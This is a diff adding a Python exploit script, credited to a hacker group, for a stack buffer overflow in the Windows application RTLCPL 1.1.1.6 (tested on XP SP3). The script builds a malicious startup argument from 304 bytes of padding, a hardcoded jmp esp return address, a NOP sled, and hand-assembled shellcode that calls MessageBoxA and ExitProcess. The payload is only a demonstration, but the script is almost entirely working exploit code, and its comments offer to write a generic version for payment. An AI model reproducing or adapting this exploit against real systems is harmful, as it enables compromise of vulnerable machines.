@@ -1,0 +1,40 @@
+# done by BraniX <branix@hackers.org.pl>
+# www.hackers.org.pl
+# found: 2010.08.24
+# tested on: Windows XP SP3 Home Edition
+
+# App. has classic buffer overflow vulnerability
+# it can be triggered by passing a too long argument 
+# as a startup parameter. Shellcode can by run via classic
+# ret overwrite or SEH Handler overwrite ... so it's a mini-combo ;)
+
+# Ps. If you need a generic exploit ...
+# (no hardcoded VA'a), write it yourself ;) or 'donate few' $$$ 
+# we will c0de it for You ^^
+
+filepath = "C:\\ShellCode\\RTLCPL 1.1.1.6 - Exploit.bin"
+f = open(filepath, "wb")
+
+f.write('[BraniX]')
+f.write('A' * 304)                  # garbage
+
+# shellcode
+f.write('\xF7\x5A\x3A\x7E')         # jmp esp in user32
+f.write('\x90' * 21)                # nop's
+
+f.write('\x50')                     # push eax
+f.write('\x53')                     # push ebx
+f.write('\x53')                     # push ebx
+f.write('\x50')                     # push eax
+f.write('\x43')                     # inc ebx   
+f.write('\x83\xC3\07')              # add ebx, 7
+f.write('\x88\x03')                 # mov byte ptr [ebx], al
+f.write('\xE8\x36\x08\x27\x7E')     # call user32.MessageBoxA
+
+f.write('\x57')                     # push edi
+f.write('\xE8\x58\xCB\x6E\x7C')     # call kernel32.ExitProcess
+
+f.write('\xCC' * 50)                # int 3's
+f.close()
+
+print "Done ..."
